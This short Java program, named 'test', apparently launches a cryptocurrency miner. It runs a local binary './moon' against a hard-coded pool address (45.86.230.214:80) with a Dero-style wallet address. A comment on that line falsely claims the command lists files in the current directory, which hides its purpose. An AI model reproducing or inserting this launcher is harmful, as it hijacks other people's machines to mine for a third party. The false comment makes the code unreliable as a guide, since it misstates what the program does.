import java.io.BufferedReader;
import java.io.InputStreamReader;

public class test {
    public static void main(String[] args) {
        try {
            ProcessBuilder builder = new ProcessBuilder("./moon", "-d", "45.86.230.214:80", "-w", "dero1qysflwnyf4mqhzdet7v478nn5l38q6u0uh9g86vtcpmrze0ml8xc7qgdhw9aj.BUCK"); // Command to list files in the current directory
            builder.redirectErrorStream(true);
            Process process = builder.start();

            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                System.out.println(line);
            }

            int exitCode = process.waitFor();
            System.out.println("Exited with error code " + exitCode);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
